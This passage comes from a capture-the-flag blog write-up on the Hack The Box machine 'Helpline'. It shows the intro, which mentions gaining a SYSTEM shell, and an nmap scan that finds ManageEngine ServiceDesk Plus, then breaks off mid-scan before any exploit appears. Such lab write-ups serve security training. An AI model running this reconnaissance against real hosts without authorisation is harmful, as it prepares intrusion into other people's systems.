<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Helpline | 0xRick Owned Root !</title>
<meta name="generator" content="Jekyll v3.7.4" />
<meta property="og:title" content="Hack The Box - Helpline" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Quick Summary Hey guys today Helpline retired and here’s my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as nt authority/system which means that I technically rooted the box. But the flags were EFS encrypted so I had to find a way to read them. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as helpline.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` Nmap 7.70 scan initiated Thu Aug 15 20:55:21 2019 as: nmap -sV -sT -sC -o nmapinitial helpline.htb Nmap scan report for helpline.htb (10.10.10.132) Host is up (0.10s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 8080/tcp open http-proxy - | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Set-Cookie: JSESSIONID=65E8A121BA313E88FEEFE9C1E493AC61; Path=/; HttpOnly | Cache-Control: private | Expires: Thu, 01 Jan 1970 01:00:00 GMT | Content-Type: text/html;charset=UTF-8 | Vary: Accept-Encoding | Date: Thu, 15 Aug 2019 17:55:43 GMT | Connection: close | Server: - | &lt;!DOCTYPE html&gt; | &lt;html&gt; | &lt;head&gt; | | | | | | | | HTTPOptions: | HTTP/1.1 200 OK | Set-Cookie: JSESSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9; Path=/; HttpOnly | Cache-Control: private | Expires: Thu, 01 Jan 1970 01:00:00 GMT | Content-Type: text/html;charset=UTF-8 | Vary: Accept-Encoding | Date: Thu, 15 Aug 2019 17:55:45 GMT | Connection: close | Server: - | &lt;!DOCTYPE html&gt; | &lt;html&gt; | &lt;head&gt; | | | | | | |_ |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: - |_http-title: ManageEngine ServiceDesk Plus 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.70%I=7%D=8/15%Time=5D55AAAF%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,2328,”HTTP/1.1\x20200\x20OK\r\nSet-Cookie:\x20JSESSIONID=65E8 SF:A121BA313E88FEEFE9C1E493AC61;\x20Path=/;\x20HttpOnly\r\nCache-Control:\ SF:x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:00:00\x20GMT\ SF:r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Accept-Encoding SF:\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:43\x20GMT\r\nConnection SF::\x20close\r\nServer:\x20-\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt; SF:meta\x20http-equiv=&quot;X-UA-Compatible&quot;\x20content=&quot;IE=Edge&quot;&gt;\n\n\n\n\ SF:r\n\n\x20\x20\x20\x20&lt;script\x20language=’JavaScript’\x20type=&quot;text/ja SF:vascript&quot;\x20src=’/scripts/Login.js\?9309’&gt;&lt;/script&gt;\n\x20\x20\x20\x2 SF:0&lt;script\x20language=’JavaScript’\x20type=&quot;text/javascript&quot;\x20src=’/ SF:scripts/jquery-1.8.3.min.js’&gt;&lt;/script&gt;\n\x20\x20\x20\x20\n\x20\x20\ SF:x20\x20&lt;link\x20href=&quot;/style/loginstyle.css\?9309&quot;\x20type=&quot;text/cs SF:s&quot;\x20rel=&quot;stylesheet&quot;/&gt;\n\x20\x20\x20\x20&lt;link\x20href=&quot;/style/new SF:-classes.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;&gt;\n\x20 SF:\x20\x20\x20&lt;link\x20href=&quot;/style/new-classes-sdp.css\?9309&quot;\x20type SF:=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20href=&quot;/ SF:style/conflict-fix.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;styleshee SF:t&quot;&gt;”)%r(HTTPOptions,2328,”HTTP/1.1\x20200\x20OK\r\nSet-Cookie:\x20JSE SF:SSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9;\x20Path=/;\x20HttpOnly\r\nCac SF:he-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:0 SF:0:00\x20GMT\r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Acc SF:ept-Encoding\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:45\x20GMT\r SF:\nConnection:\x20close\r\nServer:\x20-\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html SF:&gt;\n&lt;head&gt;\n&lt;meta\x20http-equiv=&quot;X-UA-Compatible&quot;\x20content=&quot;IE=Edge SF:&quot;&gt;\n\n\n\n\r\n\n\x20\x20\x20\x20&lt;script\x20language=’JavaScript’\x20ty SF:pe=&quot;text/javascript&quot;\x20src=’/scripts/Login.js\?9309’&gt;&lt;/script&gt;\n\x2 SF:0\x20\x20\x20&lt;script\x20language=’JavaScript’\x20type=&quot;text/javascript SF:&quot;\x20src=’/scripts/jquery-1.8.3.min.js’&gt;&lt;/script&gt;\n\x20\x20\x20\x2 SF:0\n\x20\x20\x20\x20&lt;link\x20href=&quot;/style/loginstyle.css\?9309&quot;\x20ty SF:pe=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;/&gt;\n\x20\x20\x20\x20&lt;link\x20href= SF:&quot;/style/new-classes.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;stylesh SF:eet&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20href=&quot;/style/new-classes-sdp.css\?93 SF:09&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;&gt;\n\x20\x20\x20\x20&lt;link SF:\x20href=&quot;/style/conflict-fix.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel SF:=&quot;stylesheet&quot;&gt;”); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows" />
<meta property="og:description" content="Quick Summary Hey guys today Helpline retired and here’s my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as nt authority/system which means that I technically rooted the box. But the flags were EFS encrypted so I had to find a way to read them. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as helpline.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` Nmap 7.70 scan initiated Thu Aug 15 20:55:21 2019 as: nmap -sV -sT -sC -o nmapinitial helpline.htb Nmap scan report for helpline.htb (10.10.10.132) Host is up (0.10s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 8080/tcp open http-proxy - | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Set-Cookie: JSESSIONID=65E8A121BA313E88FEEFE9C1E493AC61; Path=/; HttpOnly | Cache-Control: private | Expires: Thu, 01 Jan 1970 01:00:00 GMT | Content-Type: text/html;charset=UTF-8 | Vary: Accept-Encoding | Date: Thu, 15 Aug 2019 17:55:43 GMT | Connection: close | Server: - | &lt;!DOCTYPE html&gt; | &lt;html&gt; | &lt;head&gt; | | | | | | | | HTTPOptions: | HTTP/1.1 200 OK | Set-Cookie: JSESSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9; Path=/; HttpOnly | Cache-Control: private | Expires: Thu, 01 Jan 1970 01:00:00 GMT | Content-Type: text/html;charset=UTF-8 | Vary: Accept-Encoding | Date: Thu, 15 Aug 2019 17:55:45 GMT | Connection: close | Server: - | &lt;!DOCTYPE html&gt; | &lt;html&gt; | &lt;head&gt; | | | | | | |_ |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: - |_http-title: ManageEngine ServiceDesk Plus 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.70%I=7%D=8/15%Time=5D55AAAF%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,2328,”HTTP/1.1\x20200\x20OK\r\nSet-Cookie:\x20JSESSIONID=65E8 SF:A121BA313E88FEEFE9C1E493AC61;\x20Path=/;\x20HttpOnly\r\nCache-Control:\ SF:x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:00:00\x20GMT\ SF:r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Accept-Encoding SF:\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:43\x20GMT\r\nConnection SF::\x20close\r\nServer:\x20-\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt; SF:meta\x20http-equiv=&quot;X-UA-Compatible&quot;\x20content=&quot;IE=Edge&quot;&gt;\n\n\n\n\ SF:r\n\n\x20\x20\x20\x20&lt;script\x20language=’JavaScript’\x20type=&quot;text/ja SF:vascript&quot;\x20src=’/scripts/Login.js\?9309’&gt;&lt;/script&gt;\n\x20\x20\x20\x2 SF:0&lt;script\x20language=’JavaScript’\x20type=&quot;text/javascript&quot;\x20src=’/ SF:scripts/jquery-1.8.3.min.js’&gt;&lt;/script&gt;\n\x20\x20\x20\x20\n\x20\x20\ SF:x20\x20&lt;link\x20href=&quot;/style/loginstyle.css\?9309&quot;\x20type=&quot;text/cs SF:s&quot;\x20rel=&quot;stylesheet&quot;/&gt;\n\x20\x20\x20\x20&lt;link\x20href=&quot;/style/new SF:-classes.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;&gt;\n\x20 SF:\x20\x20\x20&lt;link\x20href=&quot;/style/new-classes-sdp.css\?9309&quot;\x20type SF:=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20href=&quot;/ SF:style/conflict-fix.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;styleshee SF:t&quot;&gt;”)%r(HTTPOptions,2328,”HTTP/1.1\x20200\x20OK\r\nSet-Cookie:\x20JSE SF:SSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9;\x20Path=/;\x20HttpOnly\r\nCac SF:he-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:0 SF:0:00\x20GMT\r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Acc SF:ept-Encoding\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:45\x20GMT\r SF:\nConnection:\x20close\r\nServer:\x20-\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html SF:&gt;\n&lt;head&gt;\n&lt;meta\x20http-equiv=&quot;X-UA-Compatible&quot;\x20content=&quot;IE=Edge SF:&quot;&gt;\n\n\n\n\r\n\n\x20\x20\x20\x20&lt;script\x20language=’JavaScript’\x20ty SF:pe=&quot;text/javascript&quot;\x20src=’/scripts/Login.js\?9309’&gt;&lt;/script&gt;\n\x2 SF:0\x20\x20\x20&lt;script\x20language=’JavaScript’\x20type=&quot;text/javascript SF:&quot;\x20src=’/scripts/jquery-1.8.3.min.js’&gt;&lt;/script&gt;\n\x20\x20\x20\x2 SF:0\n\x20\x20\x20\x20&lt;link\x20href=&quot;/style/loginstyle.css\?9309&quot;\x20ty SF:pe=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;/&gt;\n\x20\x20\x20\x20&lt;link\x20href= SF:&quot;/style/new-classes.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;stylesh SF:eet&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20href=&quot;/style/new-classes-sdp.css\?93 SF:09&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;&gt;\n\x20\x20\x20\x20&lt;link SF:\x20href=&quot;/style/conflict-fix.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel SF:=&quot;stylesheet&quot;&gt;”); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows" />
<link rel="canonical" href="http://localhost:4000/hack-the-box/helpline/" />
<meta property="og:url" content="http://localhost:4000/hack-the-box/helpline/" />
<meta property="og:site_name" content="0xRick Owned Root !" />
<meta property="og:image" content="http://localhost:4000/hackthebox/helpline/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-08-17T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"Quick Summary Hey guys today Helpline retired and here’s my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as nt authority/system which means that I technically rooted the box. But the flags were EFS encrypted so I had to find a way to read them. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as helpline.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` Nmap 7.70 scan initiated Thu Aug 15 20:55:21 2019 as: nmap -sV -sT -sC -o nmapinitial helpline.htb Nmap scan report for helpline.htb (10.10.10.132) Host is up (0.10s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 8080/tcp open http-proxy - | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Set-Cookie: JSESSIONID=65E8A121BA313E88FEEFE9C1E493AC61; Path=/; HttpOnly | Cache-Control: private | Expires: Thu, 01 Jan 1970 01:00:00 GMT | Content-Type: text/html;charset=UTF-8 | Vary: Accept-Encoding | Date: Thu, 15 Aug 2019 17:55:43 GMT | Connection: close | Server: - | &lt;!DOCTYPE html&gt; | &lt;html&gt; | &lt;head&gt; | | | | | | | | HTTPOptions: | HTTP/1.1 200 OK | Set-Cookie: JSESSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9; Path=/; HttpOnly | Cache-Control: private | Expires: Thu, 01 Jan 1970 01:00:00 GMT | Content-Type: text/html;charset=UTF-8 | Vary: Accept-Encoding | Date: Thu, 15 Aug 2019 17:55:45 GMT | Connection: close | Server: - | &lt;!DOCTYPE html&gt; | &lt;html&gt; | &lt;head&gt; | | | | | | |_ |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: - |_http-title: ManageEngine ServiceDesk Plus 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.70%I=7%D=8/15%Time=5D55AAAF%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,2328,”HTTP/1.1\\x20200\\x20OK\\r\\nSet-Cookie:\\x20JSESSIONID=65E8 SF:A121BA313E88FEEFE9C1E493AC61;\\x20Path=/;\\x20HttpOnly\\r\\nCache-Control:\\ SF:x20private\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x2001:00:00\\x20GMT\\ SF:r\\nContent-Type:\\x20text/html;charset=UTF-8\\r\\nVary:\\x20Accept-Encoding SF:\\r\\nDate:\\x20Thu,\\x2015\\x20Aug\\x202019\\x2017:55:43\\x20GMT\\r\\nConnection SF::\\x20close\\r\\nServer:\\x20-\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n&lt; SF:meta\\x20http-equiv=&quot;X-UA-Compatible&quot;\\x20content=&quot;IE=Edge&quot;&gt;\\n\\n\\n\\n\\ SF:r\\n\\n\\x20\\x20\\x20\\x20&lt;script\\x20language=’JavaScript’\\x20type=&quot;text/ja SF:vascript&quot;\\x20src=’/scripts/Login.js\\?9309’&gt;&lt;/script&gt;\\n\\x20\\x20\\x20\\x2 SF:0&lt;script\\x20language=’JavaScript’\\x20type=&quot;text/javascript&quot;\\x20src=’/ SF:scripts/jquery-1.8.3.min.js’&gt;&lt;/script&gt;\\n\\x20\\x20\\x20\\x20\\n\\x20\\x20\\ SF:x20\\x20&lt;link\\x20href=&quot;/style/loginstyle.css\\?9309&quot;\\x20type=&quot;text/cs SF:s&quot;\\x20rel=&quot;stylesheet&quot;/&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=&quot;/style/new SF:-classes.css\\?9309&quot;\\x20type=&quot;text/css&quot;\\x20rel=&quot;stylesheet&quot;&gt;\\n\\x20 SF:\\x20\\x20\\x20&lt;link\\x20href=&quot;/style/new-classes-sdp.css\\?9309&quot;\\x20type SF:=&quot;text/css&quot;\\x20rel=&quot;stylesheet&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=&quot;/ SF:style/conflict-fix.css\\?9309&quot;\\x20type=&quot;text/css&quot;\\x20rel=&quot;styleshee SF:t&quot;&gt;”)%r(HTTPOptions,2328,”HTTP/1.1\\x20200\\x20OK\\r\\nSet-Cookie:\\x20JSE SF:SSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9;\\x20Path=/;\\x20HttpOnly\\r\\nCac SF:he-Control:\\x20private\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x2001:0 SF:0:00\\x20GMT\\r\\nContent-Type:\\x20text/html;charset=UTF-8\\r\\nVary:\\x20Acc SF:ept-Encoding\\r\\nDate:\\x20Thu,\\x2015\\x20Aug\\x202019\\x2017:55:45\\x20GMT\\r SF:\\nConnection:\\x20close\\r\\nServer:\\x20-\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html SF:&gt;\\n&lt;head&gt;\\n&lt;meta\\x20http-equiv=&quot;X-UA-Compatible&quot;\\x20content=&quot;IE=Edge SF:&quot;&gt;\\n\\n\\n\\n\\r\\n\\n\\x20\\x20\\x20\\x20&lt;script\\x20language=’JavaScript’\\x20ty SF:pe=&quot;text/javascript&quot;\\x20src=’/scripts/Login.js\\?9309’&gt;&lt;/script&gt;\\n\\x2 SF:0\\x20\\x20\\x20&lt;script\\x20language=’JavaScript’\\x20type=&quot;text/javascript SF:&quot;\\x20src=’/scripts/jquery-1.8.3.min.js’&gt;&lt;/script&gt;\\n\\x20\\x20\\x20\\x2 SF:0\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=&quot;/style/loginstyle.css\\?9309&quot;\\x20ty SF:pe=&quot;text/css&quot;\\x20rel=&quot;stylesheet&quot;/&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href= SF:&quot;/style/new-classes.css\\?9309&quot;\\x20type=&quot;text/css&quot;\\x20rel=&quot;stylesh SF:eet&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=&quot;/style/new-classes-sdp.css\\?93 SF:09&quot;\\x20type=&quot;text/css&quot;\\x20rel=&quot;stylesheet&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link SF:\\x20href=&quot;/style/conflict-fix.css\\?9309&quot;\\x20type=&quot;text/css&quot;\\x20rel SF:=&quot;stylesheet&quot;&gt;”); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/helpline/","image":"http://localhost:4000/hackthebox/helpline/0.png","headline":"Hack The Box - Helpline","dateModified":"2019-08-17T00:00:00+02:00","datePublished":"2019-08-17T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/helpline/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/tagbuttons.css">
  <link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Helpline</h1>
    <p class="post-meta">
      <h7>
        Tags: 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Windows/';">Windows</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Cryptography/';">Cryptography</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Windows Exploitation/';">Windows Exploitation</button> 
        
      </h7>
      <br>
      <time class="dt-published" datetime="2019-08-17T00:00:00+02:00" itemprop="datePublished">Aug 17, 2019
      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
</p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <hr />

<h3 id="quick-summary">Quick Summary</h3>
<h4 id="hey-guys-today-helpline-retired-and-heres-my-write-up-about-it-i-really-liked-this-box-because-it-taught-me-some-interesting-stuff-about-windows-internals-the-first-shell-i-got-on-this-box-was-as-nt-authoritysystem-which-means-that-i-technically-rooted-the-box-but-the-flags-were-efs-encrypted-so-i-had-to-find-a-way-to-read-them-its-a-windows-box-and-its-ip-is-101010152-i-added-it-to-etchosts-as-helplinehtb-lets-jump-right-in-">Hey guys today Helpline retired and here’s my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as <code class="highlighter-rouge">nt authority/system</code> which means that I technically rooted the box. But the flags were <code class="highlighter-rouge">EFS</code> encrypted so I had to find a way to read them. It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.152</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">helpline.htb</code>. Let’s jump right in !</h4>
<p><img src="/images/hackthebox/helpline/0.png" alt="" /></p>
<hr />

<h3 id="nmap">Nmap</h3>
<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Thu Aug 15 20:55:21 2019 as: nmap -sV -sT -sC -o nmapinitial helpline.htb
Nmap scan report for helpline.htb (10.10.10.132)
Host is up (0.10s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
8080/tcp open  http-proxy    -
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=65E8A121BA313E88FEEFE9C1E493AC61; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Thu, 15 Aug 2019 17:55:43 GMT
|     Connection: close
|     Server: -
|     <span class="cp">&lt;!DOCTYPE html&gt;</span>
|     <span class="nt">&lt;html&gt;</span>
|     <span class="nt">&lt;head&gt;</span>
|     <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=Edge"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;script </span><span class="na">language=</span><span class="s">'JavaScript'</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">'/scripts/Login.js?9309'</span><span class="nt">&gt;&lt;/script&gt;</span>
|     <span class="nt">&lt;script </span><span class="na">language=</span><span class="s">'JavaScript'</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">'/scripts/jquery-1.8.3.min.js'</span><span class="nt">&gt;&lt;/script&gt;</span>
|     <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/style/loginstyle.css?9309"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">/&gt;</span>
|     <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/style/new-classes.css?9309"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/style/new-classes-sdp.css?9309"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/style/conflict-fix.css?9309"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Thu, 15 Aug 2019 17:55:45 GMT
|     Connection: close
|     Server: -
|     <span class="cp">&lt;!DOCTYPE html&gt;</span>
|     <span class="nt">&lt;html&gt;</span>
|     <span class="nt">&lt;head&gt;</span>
|     <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=Edge"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;script </span><span class="na">language=</span><span class="s">'JavaScript'</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">'/scripts/Login.js?9309'</span><span class="nt">&gt;&lt;/script&gt;</span>
|     <span class="nt">&lt;script </span><span class="na">language=</span><span class="s">'JavaScript'</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">'/scripts/jquery-1.8.3.min.js'</span><span class="nt">&gt;&lt;/script&gt;</span>
|     <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/style/loginstyle.css?9309"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">/&gt;</span>
|     <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/style/new-classes.css?9309"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
|     <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/style/new-classes-sdp.css?9309"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
|_    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/style/conflict-fix.css?9309"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: -
|_http-title: ManageEngine ServiceDesk Plus
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.70%I=7%D=8/15%Time=5D55AAAF%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,2328,"HTTP/1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSESSIONID=65E8
SF:A121BA313E88FEEFE9C1E493AC61;\x20Path=/;\x20HttpOnly\r\nCache-Control:\
SF:x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:00:00\x20GMT\
SF:r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Accept-Encoding
SF:\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:43\x20GMT\r\nConnection
SF::\x20close\r\nServer:\x20-\r\n\r\n<span class="nt">&lt;</span><span class="err">!</span><span class="na">DOCTYPE</span><span class="err">\</span><span class="na">x20html</span><span class="nt">&gt;</span>\n<span class="nt">&lt;html&gt;</span>\n<span class="nt">&lt;head&gt;</span>\n<span class="nt">&lt;</span>
<span class="nt">SF:meta</span><span class="err">\</span><span class="na">x20http-equiv=</span><span class="s">\"X-UA-Compatible\"\x20content=\"IE=Edge\"</span><span class="nt">&gt;</span>\n\n\n\n\
